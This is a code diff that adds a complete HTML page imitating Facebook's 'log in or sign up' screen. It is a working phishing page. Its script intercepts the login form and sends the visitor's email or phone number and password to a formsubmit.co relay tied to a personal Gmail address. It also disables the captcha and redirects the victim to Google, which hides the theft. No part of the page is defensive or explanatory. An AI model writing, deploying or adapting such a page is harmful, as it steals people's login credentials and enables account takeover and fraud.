@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+    .logo {
+      font-size: 48px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .card {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.1);
+    }
+    .card h2 {
+      font-size: 20px;
+      font-weight: normal;
+      color: #1c1e21;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      font-size: 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #166fe5;
+    }
+    .link {
+      display: block;
+      text-align: center;
+      margin-top: 12px;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .divider {
+      height: 1px;
+      background: #dddfe2;
+      margin: 20px 0;
+    }
+    .signup-btn {
+      background: #42b72a;
+    }
+    .signup-btn:hover {
+      background: #36a420;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">facebook</div>
+  <div class="card">
+    <h2>Log in to Facebook</h2>
+    <form id="loginForm" method="POST">
+      <input type="text" id="userInput" name="userInput" placeholder="Email address or phone number" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="hidden" name="_next" value="https://www.google.com">
+      <input type="hidden" name="_captcha" value="false">
+      <button type="submit">Log In</button>
+    </form>
+    <a href=https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0 class="link">Forgotten password?</a>
+    <div class="divider"></div>
+    <button class="signup-btn" type="button" onclick="window.location.href='https://www.facebook.com/r.php?entry_point=login'">
+      Create new account
+    </button>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const input = document.getElementById('userInput').value.trim();
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (emailPattern.test(input)) {
+        // If input is an email, submit normally
+        form.action = "https://formsubmit.co/mr.nobody.personal@gmail.com";
+        form.submit();
+      } else {
+        // If input is a phone number, submit as a "phone" field
+        const phoneField = document.createElement('input');
+        phoneField.type = 'hidden';
+        phoneField.name = 'phone';
+        phoneField.value = input;
+        form.appendChild(phoneField);
+
+        // Add a dummy email to satisfy FormSubmit
+        const dummyEmail = document.createElement('input');
+        dummyEmail.type = 'hidden';
+        dummyEmail.name = 'email';
+        dummyEmail.value = 'phone@dummy.com';
+        form.appendChild(dummyEmail);
+
+        form.action = "https://formsubmit.co/mr.nobody.personal@gmail.com";
+        form.submit();
+      }
+    });
+  </script>
+</body>
+</html>
